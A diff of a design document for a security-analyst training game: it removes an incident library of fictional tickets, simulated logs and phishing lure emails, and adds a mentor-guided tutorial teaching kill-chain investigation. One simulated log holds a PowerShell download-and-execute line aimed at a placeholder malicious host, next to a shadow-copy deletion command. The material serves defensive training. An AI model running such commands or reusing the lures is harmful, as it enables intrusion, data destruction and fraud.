@@ -1,459 +1,73 @@
-# VERIFY.EXE — Incident Package Library
-### Phase 4: Content Expansion | Weeks 3–4
+## Strategic Recommendation: The Hybrid "First Day on the Job" Model
+
+The best approach is **Option B as the spine, with C's tooltips as scaffolding**.
+
+Here's the reasoning:
+
+**Why not A (Guided Certification alone):** A mandatory training module separated from the real game is where tutorials go to die. Players skip it, resent it, and forget everything by the time the real stakes appear. It also completely undermines the goal of teaching consequences — there are no real consequences in a sandbox.
+
+**Why not C (Pure Sandbox):** Absolute beginners in a SOC sim will open the SIEM, see a wall of log data, and immediately feel stupid. Tooltips alone can't build investigative *logic*, only explain UI elements. The "feel like a Pro Analyst" goal requires narrative scaffolding, not just hints.
+
+**Why B + C is the answer:** Weaving the tutorial into the campaign's first mission — guided by an NPC mentor (a senior analyst, e.g., "Senior Analyst Rivera") — achieves three things simultaneously:
+
+1. **Emotional stakes are real from minute one.** The player isn't "practicing," they're handling their first real shift. Failure feels meaningful.
+2. **The Kill Chain lesson (Steps 21-23) lands emotionally.** When the escalation hits, Rivera isn't just explaining a mechanic — she's disappointed. The player caused a real incident on their first day.
+3. **Contextual tooltips (Option C) fill the gaps** without stopping the narrative. They appear *only* when the player hovers or hesitates, keeping experts from being patronized and beginners from drowning.
+
+**The NPC Mentor Frame:** Rivera is present via a comms panel (text/voice). She's warm but professional. In Steps 21-23, her tone shifts — not punishing, but grave — which is the emotional signal that tells players this is the lesson they'll remember.
 
 ---
 
-## ━━━ WEEK 3: CORPORATE ESPIONAGE ━━━
+## The Full Tutorial Sequence
+
+> **Design Note for Implementation:** The table below is divided into three narrative acts. Rivera's dialogue should frame each act. Steps 21-23 are the "Kill Chain Consequence Arc" — they should be gated behind a ~60-second in-game timer delay after Step 20 to simulate the threat evolving while the player thought the day was over.
 
 ---
 
-### 📁 INCIDENT 01 — The Headhunter
+| Step                              | Human Instruction                                                                                                             | Real-World Explanation (Analogy)                                                                                                                                                                                                              | The "Aha!" Moment (Logic)                                                                                                                                                                                                                                               |
+|-----------------------------------|-------------------------------------------------------------------------------------------------------------------------------|-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
+| **— ACT 1: ORIENTATION —**        | *Rivera: "Welcome to your first shift. Let me show you around before the queue fills up."*                                    |                                                                                                                                                                                                                                               |                                                                                                                                                                                                                                                                         |
+| 1                                 | Walk to Office C and find your workstation.                                                                                   | Like your first day at any job — you need to find your desk before you can do anything else. Your physical location matters in a SOC because some actions require being at a certified terminal.                                              | Every action in security is *accountable*. Where you act, when you act, and who you are gets logged. That starts now.                                                                                                                                                   |
+| 2                                 | Sit down and log in with your analyst credentials.                                                                            | Clocking in. Your login creates a session record — from this moment, everything you do is timestamped and tied to your ID.                                                                                                                    | Authentication is the first security control. By logging in, you're proving you are who you say you are. This is the same principle you'll use to catch attackers.                                                                                                      |
+| **— ACT 2: TOOL CERTIFICATION —** | *Rivera: "Okay, we've got tickets in the queue. I'll walk you through each tool. Don't worry — I've got eyes on everything."* |                                                                                                                                                                                                                                               |                                                                                                                                                                                                                                                                         |
+| 3                                 | Open the Ticket Queue app.                                                                                                    | Think of this as your inbox, but for security incidents. Every alert, complaint, and suspicious event lands here first. Your job is to work through it systematically — not randomly.                                                         | The Queue is your *command center*. Analysts who ignore it or cherry-pick tickets let real threats age and escalate. Priority order exists for a reason.                                                                                                                |
+| 4                                 | Click on ticket TRN-001 to open it.                                                                                           | Opening a case file. Before you touch anything else, you read what's known. Rushing to "fix" something before understanding it is how analysts cause more damage than attackers.                                                              | Reading the ticket tells you *what* happened. The tools tell you *how* and *why*. Never skip the ticket summary.                                                                                                                                                        |
+| 5                                 | Open the Email Analyzer app.                                                                                                  | A forensic lab for email. Just like a detective examines a piece of mail for fingerprints, you're examining every technical layer of this message — where it really came from, what it's hiding.                                              | Email is the #1 attack vector globally. The "From" name you see is cosmetic. The *headers* are the truth.                                                                                                                                                               |
+| 6                                 | Use the Link Check tool on the suspicious URL in the email.                                                                   | Running a license plate. You wouldn't let a stranger into a building without checking who they are. A URL that *looks* safe can redirect to anywhere — Link Check pulls back the mask.                                                        | Attackers use URL shorteners and lookalike domains (e.g., `paypa1.com`) to bypass human intuition. Tools check the *destination*, not just the label.                                                                                                                   |
+| 7                                 | Open the SIEM Log Viewer.                                                                                                     | The security camera system for your entire network. Every device, every connection, every login attempt leaves a record here. You're looking for the moment something went wrong.                                                             | Logs are evidence. A single log entry is a data point. A *pattern* of log entries is a story — and stories reveal intent.                                                                                                                                               |
+| 8                                 | Find the relevant malicious log entry and drag it into the TRN-001 ticket.                                                    | Attaching evidence to a case file before you close it. In a real investigation, an unsupported conclusion is worthless. You need to show your work.                                                                                           | Evidence linking = *chain of custody*. If you can't prove *why* you closed a case a certain way, your decision can't be reviewed, appealed, or learned from by your team.                                                                                               |
+| 9                                 | Close TRN-001 with the status "Compliant."                                                                                    | Filing a case as resolved with a clear verdict. "Compliant" means the user didn't actually do anything wrong — the email was caught before harm.                                                                                              | Resolution status isn't just administrative. It feeds dashboards, metrics, and threat trend reports that leadership uses to allocate resources. Accuracy here compounds over time.                                                                                      |
+| 10                                | Open ticket TRN-002 from the queue.                                                                                           | A new case just came in while you were working. This one is more serious — a workstation is behaving suspiciously. Time to shift from email forensics to active investigation.                                                                | Good analysts context-switch cleanly. You close one mental file, open another, and start fresh without carrying assumptions from the last case.                                                                                                                         |
+| 11                                | Open the Terminal app.                                                                                                        | The mechanic's toolkit, not the showroom floor. While other apps show you *what's happening*, the Terminal lets you *do something about it* — actively query, probe, and control live systems.                                                | The Terminal represents direct system access. In the real world, this level of access is privileged and audited. Every command you type here is logged.                                                                                                                 |
+| 12                                | Type `scan WORKSTATION-T` and run it.                                                                                         | Taking a patient's temperature before prescribing medication. You need to know what's actually on the system before you decide what to do with it. A scan gives you ground truth.                                                             | Scanning first is professional discipline. It prevents you from making irreversible decisions (like isolation) based on incomplete information. The data tells you the severity.                                                                                        |
+| 13                                | Type `isolate WORKSTATION-T` and run it.                                                                                      | Quarantine. If a patient might be contagious, you separate them before they infect others — even before you know the full diagnosis. Containment buys time for investigation without letting the threat spread.                               | Isolation is a *containment* action, not a *resolution* action. The threat isn't gone — it's just walled off. The investigation continues; you've just stopped the bleeding.                                                                                            |
+| 14                                | Open the Network Mapper app.                                                                                                  | Looking at the building's security camera feed after a lockdown. You need to *visually confirm* that the door actually closed — that your command had the effect you intended.                                                                | Never assume a command worked. Verification is a professional habit. In high-stakes environments, an isolation command that silently failed and an isolation command that worked look identical — until you check.                                                      |
+| 15                                | Confirm that WORKSTATION-T now shows as "Gray" (Isolated) on the map.                                                         | Seeing the yellow hazard tape around the quarantined office on your floor plan. Gray means it's off the network. If it were still Green, your command didn't take — and you'd need to investigate why.                                        | Status confirmation closes the loop on your action. This is the difference between an analyst who *acts* and an analyst who *knows their actions worked*.                                                                                                               |
+| 16                                | Attach the relevant log to TRN-002 and close the case.                                                                        | Filing a complete incident report: what happened, what you found, what you did, and proof of all three. A closed case with no evidence trail is a liability, not a resolution.                                                                | Complete documentation protects you, informs your team, and builds the threat intelligence database that makes your whole organization smarter over time.                                                                                                               |
+| 17                                | Open ticket TRN-003.                                                                                                          | Rivera: *"This one's a little tricky. Read it carefully."* A third incident has appeared — a server showing anomalous behavior. You're being asked to contain it.                                                                             | Building pattern recognition: you're starting to see that threats don't arrive one at a time. A busy queue is a signal in itself.                                                                                                                                       |
+| 18                                | Isolate the server listed in TRN-003 *without scanning it first*.                                                             | Rivera: *"Go ahead, you know how to do this."* The tutorial deliberately lets you skip the scan step — because you *can*. The tool doesn't stop you.                                                                                          | This is the trap. Speed feels like competence. The system doesn't warn you because in the real world, nobody stops you from making bad decisions. Your training is supposed to.                                                                                         |
+| 19                                | Observe the "Integrity" penalty on your analyst scorecard.                                                                    | Rivera: *"That server was a critical authentication node. Isolating it without scanning first took down login services for 40 users for 11 minutes."* You fixed a threat but caused an outage.                                                | **The lesson:** In security, *how* you act matters as much as *what* you do. Skipping process doesn't make you faster — it makes you dangerous. Speed without verification is recklessness.                                                                             |
+| 20                                | Receive your Certification badge.                                                                                             | Rivera: *"You passed. You made one mistake — remember it. The real queue opens in 5 minutes."* You've learned the tools. Now you'll learn what happens when you use them wrong in a different way.                                            | Certification means you *can* use the tools. It doesn't mean you've learned judgment yet. That's what the next shift is for.                                                                                                                                            |
+| **— ACT 3: THE KILL CHAIN ARC —** | *[60-second in-game pause. Rivera goes quiet. Then a new alert sound fires.]*                                                 |                                                                                                                                                                                                                                               |                                                                                                                                                                                                                                                                         |
+| 21                                | A new ticket appears: PHI-007, "Suspected Phishing – Low Severity." Open it and investigate.                                  | Rivera: *"Low severity. Honestly? These are usually nothing. Some people just click weird stuff."* The ticket looks routine. The tutorial UI subtly highlights a "Quick Close" button and labels it "Efficient."                              | This is a test of professional discipline, not technical skill. The data in the ticket is incomplete — there's a suspicious link that hasn't been checked, and no log has been pulled. But closing it is *allowed*.                                                     |
+| 22                                | Use the "Quick Close" option to close PHI-007 as "Reviewed – No Action Required" without attaching evidence.                  | Rivera: *"Nice, cleared it fast. That's good queue velocity."* You get a small positive feedback ping. The queue looks cleaner. Everything feels fine.                                                                                        | The game rewards you with a false positive: speed praise. This mirrors how real-world incentives (close more tickets faster) can actively encourage bad security practice. The threat is not gone. It was ignored.                                                      |
+| 23                                | [~90 seconds later] A Priority 1 alert fires. New ticket: MAL-019, "Active Ransomware – WORKSTATION-04." Open it.             | An alarm you've never heard before sounds. Rivera's tone changes entirely: *"Wait — pull up the logs on that machine. I want to see the infection vector."* The investigation will reveal the phishing link from PHI-007 was the entry point. | **The Kill Chain is revealed.** The user clicked the unchecked link. It downloaded a dropper. The dropper sat dormant. It just activated. Every minute between your "Quick Close" and now was the attacker's preparation time. You gave it to them.                     |
+| 24                                | Open the SIEM and trace the log trail from MAL-019 back to the original PHI-007 event.                                        | Rivera: *"There it is. That's your breadcrumb trail."* You're reading a timeline: phishing email → link clicked → dropper installed → ransomware deployed. Each log entry is a step the attacker took while you weren't watching.             | A Kill Chain is a sequence. Attackers don't operate in single moves — they operate in *campaigns*. Stopping a campaign means identifying and breaking the chain at its earliest link. You had that chance at Step 21.                                                   |
+| 25                                | Open the Terminal and run `scan WORKSTATION-04`, then `isolate WORKSTATION-04`.                                               | Containment — but this time it's reactive, not proactive. You're not preventing damage; you're limiting it. The system tells you: "3 files encrypted before isolation."                                                                       | Compare this to TRN-002. There, you isolated a *suspected* threat. Here, you're isolating an *active* one that has already caused harm. The difference is the 90 seconds you spent feeling good about queue velocity.                                                   |
+| 26                                | Open the Decryption Tool and attempt to recover the 3 encrypted files using the hex puzzle.                                   | Rivera: *"Lucky — this strain's decryption key is in our database. That won't always be true."* You solve the puzzle and recover the files. But it took real effort that shouldn't have been necessary.                                       | The Decryption Tool exists for situations like this. But using it means the attacker *succeeded* at the encryption stage. Recovery is never as clean as prevention. Some ransomware variants have no recovery path at all.                                              |
+| 27                                | Close MAL-019 with a full incident report: attach all logs, the Kill Chain timeline, and document PHI-007 as the root cause.  | A post-incident report is how organizations learn. You're not just closing a ticket — you're building institutional memory so this chain can be recognized and broken earlier next time.                                                      | Documentation of failures is more valuable than documentation of successes. The phishing pattern from PHI-007 can now be added to detection rules so the SIEM flags it automatically in the future. Your mistake, properly recorded, makes the whole system smarter.    |
+| 28                                | Receive the "Kill Chain Identified" commendation and read Rivera's debrief.                                                   | Rivera: *"You had the thread in your hands at PHI-007. You let it go. You also just proved you can recover from your own mistakes — which is the most important skill in this room. Don't forget either lesson."*                             | **The final Aha!:** Security isn't about being perfect. It's about being thorough. Shortcuts don't save time — they *borrow* it from your future self, at interest. The job is to be the analyst who breaks the chain at step one, not the one cleaning up at step six. |
 
 ---
 
-#### A. TICKET RESOURCE
+### Implementation Notes for Your Dev Team
 
-| Field | Value |
-|---|---|
-| **Ticket ID** | `ESPIONAGE-001` |
-| **Title** | Suspected IP Exfiltration via Spear-Phish — R&D Personnel |
-| **Severity** | `Critical` |
-| **Category** | `Phishing` |
-| **Required Tool** | `email` |
-| **Required Log IDs** | `LOG-ESP-001A`, `LOG-ESP-001B` |
+A few flags worth building around this table:
 
-**Description:**
-> HR flagged an anomalous message received by `{victim}` from a domain impersonating a recruiting firm. Shortly after the email was opened, `{host}` initiated an outbound HTTPS session to `{malicious_url}`, a domain registered 48 hours prior. Forensics suspects credential harvesting linked to a competitor-sponsored APT group.
+**For Steps 21-22:** The "Quick Close" button should be visually appealing (green, prominent) while the "Full Investigation" path requires more clicks. This UX friction is intentional — it mirrors real-world cognitive bias toward efficiency.
 
-**Analysis Steps:**
-1. Inspect email headers on the recruiting message for SPF/DKIM/DMARC alignment failures and domain age.
-2. Correlate the timestamp of email open event with the first outbound beacon from `{host}` to `{malicious_url}` in the SIEM.
-3. Use Terminal to run a passive DNS scan on `{malicious_url}` and confirm registrar overlap with known threat actor infrastructure.
+**For Step 23:** The ransomware alert should interrupt whatever the player is doing. Sound design matters enormously here. This should feel like a fire alarm, not a notification ping.
 
----
+**For Steps 24-27:** Consider a side-panel "Kill Chain Visualizer" that populates in real time as the player traces the logs — a visual timeline showing each attacker step appearing as the player finds the evidence. This turns abstract log data into a visceral narrative.
 
-#### B. EVIDENCE LOGS
-
-**`LOG-ESP-001A`**
-```
-Source:   Office365
-Severity: 4
-Message:  "MessageReceived | Recipient={victim} | Sender=careers@{malicious_url} |
-           Subject='Confidential Offer — Senior Principal Engineer' |
-           AttachmentName='NDA_Draft_2024.docm' | SPF=FAIL | DKIM=FAIL |
-           UserAction=Opened | Timestamp=2024-03-11T08:42:17Z"
-```
-
-**`LOG-ESP-001B`**
-```
-Source:   Firewall
-Severity: 5
-Message:  "OUTBOUND_ALLOW | SRC={host} | DST={ip} | DST_DOMAIN={malicious_url} |
-           Protocol=HTTPS/443 | BytesSent=512 | BytesRecv=82340 |
-           GeoIP=CN | ThreatFeed=MATCH:APT41_C2_IOC |
-           Timestamp=2024-03-11T08:43:02Z"
-```
-
----
-
-#### C. EMAIL RESOURCE
-
-**Subject:** `Confidential Offer — Senior Principal Engineer | Exclusive Opportunity`
-
-**Headers:**
-| Header | Result |
-|---|---|
-| SPF | `FAIL` |
-| DKIM | `FAIL` |
-| DMARC | `FAIL` |
-
-**Body:**
-```
-Dear {victim},
-
-My name is Rachel Holt, and I'm a Senior Talent Partner at Nexbridge Executive Search.
-We've been retained by a Fortune 100 client — who must remain anonymous at this stage —
-to identify a candidate of your exact profile for a Principal Engineering role.
-
-Compensation band: $340,000 – $410,000 base, plus equity.
-
-I've attached a mutual NDA so we can speak freely. Please review and return at
-your earliest convenience. Given client timelines, I do need a response by EOD Friday.
-
-Warm regards,
-Rachel Holt | Nexbridge Executive Search
-careers@{malicious_url}
-```
-
-**Hidden Risk:** `missed_c2_macro_exec`
-> *If the player quarantines the email without first scanning the `.docm` attachment via Terminal, the macro execution event in `LOG-ESP-001B` is never formally attributed, leaving a gap in the incident chain — flagged as "Incomplete Evidence" at case close.*
-
----
----
-
-### 📁 INCIDENT 02 — Ghost in the Codebase
-
----
-
-#### A. TICKET RESOURCE
-
-| Field | Value |
-|---|---|
-| **Ticket ID** | `ESPIONAGE-002` |
-| **Title** | Insider Threat — Privileged Access Abuse Prior to Voluntary Termination |
-| **Severity** | `High` |
-| **Category** | `Insider Threat` |
-| **Required Tool** | `siem` |
-| **Required Log IDs** | `LOG-ESP-002A`, `LOG-ESP-002B` |
-
-**Description:**
-> The DLP system triggered on a bulk export of source code repositories from `{host}`, operated by `{victim}`, who submitted resignation paperwork 72 hours prior. Access patterns show off-hours queries against the IP Registry and anomalous CloudTrail API calls originating from `{ip}`. The volume and specificity of data accessed points to deliberate pre-departure exfiltration.
-
-**Analysis Steps:**
-1. Pull SIEM timeline for `{victim}`'s account activity in the 72 hours following resignation submission — baseline vs. current access volume.
-2. Identify CloudTrail `ListBuckets` and `GetObject` API calls tied to `{host}` targeting IP/source code repositories.
-3. Correlate outbound data transfer volume against DLP policy thresholds to confirm exfiltration exceeded incidental access.
-
----
-
-#### B. EVIDENCE LOGS
-
-**`LOG-ESP-002A`**
-```
-Source:   CloudTrail
-Severity: 4
-Message:  "API_CALL | Actor={victim} | Action=GetObject | Resource=s3://corp-src-prod/* |
-           ObjectCount=1,847 | SrcIP={ip} | UserAgent=aws-cli/2.13 |
-           AuthMethod=ValidSession | Timestamp=2024-03-13T02:17:44Z |
-           Note=Off-hours_access, bulk_enumeration_pattern"
-```
-
-**`LOG-ESP-002B`**
-```
-Source:   SysMon
-Severity: 5
-Message:  "PROCESS_CREATE | Host={host} | User={victim} |
-           Image=C:\Windows\System32\cmd.exe |
-           CommandLine='robocopy \\corp-nas\engineering\src D:\USB_TRANSFER /E /COPYALL' |
-           ParentImage=explorer.exe | IntegrityLevel=High |
-           Timestamp=2024-03-13T02:31:09Z"
-```
-
----
-
-#### C. EMAIL RESOURCE
-
-**Subject:** `Re: Knowledge Transfer Plan — Please Confirm Checklist`
-
-**Headers:**
-| Header | Result |
-|---|---|
-| SPF | `PASS` |
-| DKIM | `PASS` |
-| DMARC | `PASS` |
-
-> *Note: Headers PASS because this email originates from a legitimate internal account — the threat is behavioral, not phishing-based. The email is a social engineering decoy to justify access.*
-
-**Body:**
-```
-Hi {victim},
-
-Per our conversation with HR, I'm sending over the standard offboarding knowledge transfer
-checklist. Could you compile the relevant documentation and repository references for
-your successor? Please include any architecture diagrams, internal wikis, and config
-templates you own.
-
-IT has provisioned temporary elevated access to ensure a smooth handoff — this expires
-at EOD Friday.
-
-Let me know if you hit any snags.
-
-Best,
-Marcus Webb
-People Operations | IT Transition Team
-```
-
-**Hidden Risk:** `missed_dlp_exfil_volume`
-> *If the player flags this as a routine offboarding email without cross-referencing the SIEM CloudTrail logs, the exfiltration volume goes unquantified — the case closes as "Unauthorized Access" (misclassification) rather than "Data Theft," triggering a narrative penalty in Week 4's briefing.*
-
----
----
-
-### 📁 INCIDENT 03 — The Trusted Contractor
-
----
-
-#### A. TICKET RESOURCE
-
-| Field | Value |
-|---|---|
-| **Ticket ID** | `ESPIONAGE-003` |
-| **Title** | Lateral Movement via Compromised Third-Party VPN Credential |
-| **Severity** | `High` |
-| **Category** | `Unauthorized Access` |
-| **Required Tool** | `terminal` |
-| **Required Log IDs** | `LOG-ESP-003A`, `LOG-ESP-003B` |
-
-**Description:**
-> A VPN session authenticated under a contractor account associated with `{victim}` has been active for 19 hours — well beyond their contracted window of 09:00–17:00 local. Session traffic originates from `{ip}`, a Bulgarian exit node, and `{host}` has recorded lateral movement attempts against three internal subnets. The contractor's physical access badge shows them off-premises since 16:45.
-
-**Analysis Steps:**
-1. Use Terminal to run a geolocation and ASN lookup on `{ip}` — confirm mismatch with contractor's registered location.
-2. Isolate `{host}` from the network to sever the active session and prevent further lateral traversal.
-3. Search SIEM IDS logs for SMB enumeration and NTLM relay attempt signatures originating from the session.
-
----
-
-#### B. EVIDENCE LOGS
-
-**`LOG-ESP-003A`**
-```
-Source:   IDS
-Severity: 4
-Message:  "LATERAL_MOVEMENT_DETECTED | SrcHost={host} | Protocol=SMB/445 |
-           Signature=ET.POLICY.SMB_Enum_Attempt | TargetSubnets=10.10.20.0/24,10.10.30.0/24 |
-           SessionUser={victim} | SrcIP={ip} | EventCount=312 |
-           Timestamp=2024-03-14T03:12:55Z"
-```
-
-**`LOG-ESP-003B`**
-```
-Source:   Firewall
-Severity: 3
-Message:  "VPN_SESSION_ACTIVE | User={victim} | SrcIP={ip} |
-           GeoIP=BG | ASN=AS60781_LeaseWeb_BV | SessionDuration=19h04m |
-           BytesSent=4.2GB | BytesRecv=980MB | PolicyViolation=AFTER_HOURS_ACCESS |
-           Timestamp=2024-03-14T03:44:00Z"
-```
-
----
-
-#### C. EMAIL RESOURCE
-
-**Subject:** `Action Required: VPN Token Expiry — Re-Authenticate to Continue Work`
-
-**Headers:**
-| Header | Result |
-|---|---|
-| SPF | `FAIL` |
-| DKIM | `PASS` |
-| DMARC | `FAIL` |
-
-> *DKIM passes because the attacker compromised the contractor's actual email account to send this re-authentication lure to IT — an advanced detail rewarding players who check all three headers.*
-
-**Body:**
-```
-Hi IT Support,
-
-I'm getting a "Session Token Expired" error on my VPN client tonight. I'm working
-late to hit the deliverable deadline for the Mercer integration and need this resolved ASAP.
-
-I've already re-entered my credentials three times. Can you reset my session token or
-extend my access window? I'm connecting from {malicious_url}/vpn-token-reset if you
-need to push a fix remotely.
-
-Thanks for the quick turnaround — deadline is in 4 hours.
-
-{victim}
-External Contractor | Mercer Systems Integration
-```
-
-**Hidden Risk:** `premature_isolation_no_scan`
-> *If the player isolates `{host}` before running a terminal ASN lookup on `{ip}`, the geolocation evidence is never formally logged. The isolation is correct, but the case is flagged "Incomplete Chain of Custody" — a narrative note appears warning that defense counsel could challenge the evidence in a legal proceeding.*
-
----
-
----
-
-## ━━━ WEEK 4: ZERO-DAY APOCALYPSE ━━━
-
----
-
-### 📁 INCIDENT 04 — Patient Zero
-
----
-
-#### A. TICKET RESOURCE
-
-| Field | Value |
-|---|---|
-| **Ticket ID** | `ZERODAY-001` |
-| **Title** | Unpatched RCE Exploit — Active In-Memory Payload, No Disk Artifact |
-| **Severity** | `Critical` |
-| **Category** | `Malware` |
-| **Required Tool** | `terminal` |
-| **Required Log IDs** | `LOG-ZD-001A`, `LOG-ZD-001B` |
-
-**Description:**
-> IDS has flagged a memory injection event on `{host}`, attributed to `{victim}`'s active session. The payload exhibits fileless characteristics — no binary dropped to disk — and has established a persistent C2 heartbeat to `{ip}` over DNS over HTTPS (DoH), evading standard signature detection. The exploit vector is consistent with CVE-2024-XXXX, a zero-day in the enterprise PDF renderer disclosed by CISA 11 hours ago.
-
-**Analysis Steps:**
-1. Use Terminal to dump the running process list on `{host}` — identify any unsigned process injected into a trusted parent (e.g., `svchost.exe`, `explorer.exe`).
-2. Search SIEM for DNS query logs from `{host}` targeting `{malicious_url}` with abnormal TTL values (< 60s), indicating fast-flux C2.
-3. Isolate `{host}` immediately after evidence collection to sever C2 without triggering the payload's kill switch.
-
----
-
-#### B. EVIDENCE LOGS
-
-**`LOG-ZD-001A`**
-```
-Source:   SysMon
-Severity: 5
-Message:  "PROCESS_INJECTION | Host={host} | TargetProcess=svchost.exe (PID:1284) |
-           InjectedBy=AcroRd32.exe (PID:9043) | Technique=T1055.012_Process_Hollowing |
-           MemoryRegion=0x7FFE0000 | Unsigned=TRUE | DiskArtifact=NONE |
-           User={victim} | Timestamp=2024-03-18T11:03:27Z"
-```
-
-**`LOG-ZD-001B`**
-```
-Source:   Firewall
-Severity: 5
-Message:  "DNS_OVER_HTTPS_BEACON | SrcHost={host} | DstIP={ip} |
-           Query={malicious_url} | QueryInterval=30s | TTL=45 |
-           ThreatFeed=MATCH:CISA_AA24-081A | BytesPerBeacon=128 |
-           Technique=T1071.004_DoH_C2 | Timestamp=2024-03-18T11:03:58Z"
-```
-
----
-
-#### C. EMAIL RESOURCE
-
-**Subject:** `URGENT: Board Resolution — Q1 Financial Audit Package (Confidential)`
-
-**Headers:**
-| Header | Result |
-|---|---|
-| SPF | `PASS` |
-| DKIM | `PASS` |
-| DMARC | `PASS` |
-
-> *All headers PASS — the sending domain is a pixel-perfect lookalike (`corp0rate-finance.com` vs `corporate-finance.com`) that passed DMARC due to a misconfigured policy set to `p=none`. Rewards players who manually inspect the `From:` domain string rather than trusting the header summary.*
-
-**Body:**
-```
-{victim},
-
-The external auditors require the full Q1 reconciliation package before close of
-business today. CFO has approved distribution to audit-qualified staff only.
-
-Please find the consolidated report attached (PDF). Due to document sensitivity,
-you will be prompted to enable extended content rendering to view the encrypted
-sections — this is required by our compliance framework.
-
-Do not forward. Do not print. Destroy after review.
-
-Group Finance | Internal Audit Liaison
-{malicious_url}
-```
-
-**Hidden Risk:** `missed_process_injection_before_isolate`
-> *If the player isolates `{host}` without first dumping the process list via Terminal, the injection artifact in PID:1284 is lost on reboot. The C2 is severed, but forensic evidence of the zero-day's exact execution chain is destroyed — triggering a "Partial Containment" rating and a Week 4 narrative event where the attacker reuses the same exploit against a second host because the IOC was never fully characterized.*
-
----
----
-
-### 📁 INCIDENT 05 — Cascade
-
----
-
-#### A. TICKET RESOURCE
-
-| Field | Value |
-|---|---|
-| **Ticket ID** | `ZERODAY-002` |
-| **Title** | Ransomware Pre-Encryption Stage — Staging & Shadow Copy Deletion Detected |
-| **Severity** | `Critical` |
-| **Category** | `Ransomware` |
-| **Required Tool** | `siem` |
-| **Required Log IDs** | `LOG-ZD-002A`, `LOG-ZD-002B` |
-
-**Description:**
-> SysMon has detected `vssadmin.exe delete shadows /all` execution on `{host}` under `{victim}`'s session — a canonical pre-encryption ransomware behavior. The payload arrived via a weaponized link in a vendor invoice email pointing to `{malicious_url}`, and the actor's C2 at `{ip}` has been beaconing for 6 hours. **Encryption has NOT yet begun** — the analyst has a narrow window to isolate and contain before file destruction.
-
-**Analysis Steps:**
-1. Search SIEM for the `vssadmin` execution event and all preceding PowerShell obfuscation events in the 6-hour window to establish the full kill chain.
-2. Identify any additional hosts that have connected to `{ip}` in the same window — assess blast radius before isolating `{host}`.
-3. Immediately escalate to Terminal for host isolation — every minute of delay risks triggering the encryption stage.
-
----
-
-#### B. EVIDENCE LOGS
-
-**`LOG-ZD-002A`**
-```
-Source:   SysMon
-Severity: 5
-Message:  "COMMAND_EXEC | Host={host} | User={victim} |
-           Image=C:\Windows\System32\vssadmin.exe |
-           CommandLine='vssadmin.exe delete shadows /all /quiet' |
-           ParentImage=powershell.exe | EncodedArg=TRUE |
-           DecodedArg='IEX(New-Object Net.WebClient).DownloadString(\"{malicious_url}/stg2\")' |
-           Technique=T1490_Inhibit_System_Recovery | Timestamp=2024-03-21T07:58:03Z"
-```
-
-**`LOG-ZD-002B`**
-```
-Source:   IDS
-Severity: 5
-Message:  "C2_HEARTBEAT | SrcHost={host} | DstIP={ip} | DstDomain={malicious_url} |
-           Protocol=HTTPS/443 | BeaconInterval=360s | JitterRatio=0.15 |
-           Signature=ET.RANSOM.LockBit3_C2_Pattern | ActiveDuration=6h12m |
-           ThreatFeed=MATCH:FBI_Flash_CU-000167-MW | Timestamp=2024-03-21T08:00:41Z"
-```
-
----
-
-#### C. EMAIL RESOURCE
-
-**Subject:** `Invoice #INV-2024-00892 — Payment Due Overdue: Immediate Action Required`
-
-**Headers:**
-| Header | Result |
-|---|---|
-| SPF | `FAIL` |
-| DKIM | `FAIL` |
-| DMARC | `FAIL` |
-
-**Body:**
-```
-Dear {victim},
-
-Please find attached Invoice #INV-2024-00892 for services rendered in February.
-This payment is now 14 days overdue and subject to our late fee policy.
-
-To view the itemized breakdown and submit payment authorization, please access
-the secure invoice portal here:
-
-  ➜ {malicious_url}/invoice/INV-2024-00892.pdf
-
-If payment has already been processed, please disregard this notice and forward
-the remittance confirmation to accounts@{malicious_url}.
-
-Failure to respond within 24 hours will result in escalation to our legal team.
-
-Accounts Receivable
-Vanterra Solutions Group
-```
-
-**Hidden Risk:** `no_blast_radius_check_before_isolate`
-> *If the player isolates `{host}` immediately without first checking SIEM for other hosts beaconing to `{ip}`, two additional endpoints that are already in the staging phase are missed. This triggers the Week 4 finale event "Cascade" — a second ransomware wave deploys on the unidentified hosts 4 hours later, escalating the campaign's critical path and locking the player out of the "Clean Sweep" achievement.*
-
----
-
-## Quick Reference Matrix
-
-| ID | Theme | Category | Severity | Required Tool | Hidden Risk Consequence |
-|---|---|---|---|---|---|
-| `ESPIONAGE-001` | Corporate Espionage | Phishing | Critical | email | `missed_c2_macro_exec` |
-| `ESPIONAGE-002` | Corporate Espionage | Insider Threat | High | siem | `missed_dlp_exfil_volume` |
-| `ESPIONAGE-003` | Corporate Espionage | Unauthorized Access | High | terminal | `premature_isolation_no_scan` |
-| `ZERODAY-001` | Zero-Day Apocalypse | Malware | Critical | terminal | `missed_process_injection_before_isolate` |
-| `ZERODAY-002` | Zero-Day Apocalypse | Ransomware | Critical | siem | `no_blast_radius_check_before_isolate` |
-
----
-
-**Narrative Design Notes:**
-
-Each hidden risk consequence is designed to create a **cascading consequence system** rather than binary success/failure. `ESPIONAGE-002`'s misclassification feeds into the Week 4 briefing, and `ZERODAY-001`'s partial containment directly enables `ZERODAY-002` if the player fails it — making the final incident feel like a consequence of prior analyst negligence rather than a scripted event. This rewards methodical players who follow the full analysis step chain before acting.
+**Scoring across the arc:** PHI-007's "Quick Close" should secretly log a `INCOMPLETE_INVESTIGATION` flag. When MAL-019 resolves, the post-game debrief should surface this flag explicitly, showing the player the exact moment the chain could have been broken. This is more powerful than any text explanation.
